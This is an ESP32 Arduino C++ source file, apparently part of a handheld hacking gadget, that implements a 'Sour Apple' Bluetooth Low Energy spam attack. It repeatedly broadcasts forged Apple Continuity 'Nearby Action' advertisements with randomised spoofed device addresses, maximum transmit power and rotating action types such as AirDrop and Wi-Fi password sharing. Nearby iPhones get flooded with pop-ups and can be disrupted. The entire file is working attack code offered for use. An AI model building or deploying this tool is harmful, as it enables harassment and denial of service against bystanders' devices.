#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEServer.h>
#include "sourapple.h"
#include "neopixel.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern Adafruit_NeoPixel pixels;

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;
uint8_t packet[17];

#define MAX_LINES 8
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;

uint32_t delayMilliseconds = 200;

void updatedisplay() {
  u8g2.clearBuffer();
  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12);
    u8g2.print(lines[i]);
  }
  u8g2.sendBuffer();
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);
  addLineToDisplay(lineStr + dataStr);
}

BLEAdvertisementData getOAdvertisementData(uint8_t actionType) {
  BLEAdvertisementData advertisementData;
  int i = 0;

  packet[i++] = 16;    // Packet Length (17 - 1)
  packet[i++] = 0xFF;  // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;  // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;  // ...
  packet[i++] = 0x0F;  // Type (Nearby Action)
  packet[i++] = 0x05;  // Length
  packet[i++] = 0xC1;  // Action Flags
  packet[i++] = actionType; // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;
  packet[i++] = 0x00; // Reserved
  packet[i++] = 0x00; // Reserved
  packet[i++] = 0x10; // Additional Type
  esp_fill_random(&packet[i], 3); // Random data
  i += 3;

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  u8g2.setFont(u8g2_font_profont11_tf);

  BLEDevice::init("");
  delay(100); // BLE stack stabilize olsun
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

  if (Advertising == nullptr) {
    addLineToDisplay("Advertising is null!");
    return; // Hata durumunda çık
  }

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  Advertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void sourappleLoop() {
  if (Advertising == nullptr) {
    addLineToDisplay("BLE Advertising not initialized!");
    return;
  }

  // Expanded action types for better coverage
  const uint8_t actionTypes[] = {
    0x27, // AirDrop
    0x09, // Nearby Share
    0x02, // Handoff
    0x1e, // Instant Hotspot
    0x2b, // Wi-Fi Password Sharing
    0x2d, // Nearby Action (Generic)
    0x2f, // Continuity
    0x01, // Proximity Pairing
    0x06, // Universal Clipboard
    0x20, // Phone Call Continuity
    0xc0  // Custom Apple Action
  };
  const int numActionTypes = sizeof(actionTypes) / sizeof(actionTypes[0]); // Doğru boyut hesaplama

  // Send multiple packets with different action types
  for (int j = 0; j < 3; j++) {
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = esp_random() % 256;
      if (i == 0) {
        dummy_addr[i] |= 0xF0; // Set as random non-resolvable address
      }
    }

    // Select a random action type
    uint8_t selectedActionType = actionTypes[rand() % numActionTypes];
    BLEAdvertisementData oAdvertisementData = getOAdvertisementData(selectedActionType);

    Advertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    Advertising->addServiceUUID(device_uuid.c_str());
    Advertising->setAdvertisementData(oAdvertisementData);

    // Randomize advertisement interval for better detection
    uint16_t minInterval = random(100, 150); // 100-150ms
    uint16_t maxInterval = random(150, 200); // 150-200ms
    Advertising->setMinInterval(minInterval);
    Advertising->setMaxInterval(maxInterval);
    Advertising->setMinPreferred(minInterval);
    Advertising->setMaxPreferred(maxInterval);

    Advertising->start();
    delay(100); // Increased delay for better device detection
    displayAdvertisementData();
    Advertising->stop();
  }

  delay(delayMilliseconds); // Wait before next cycle
}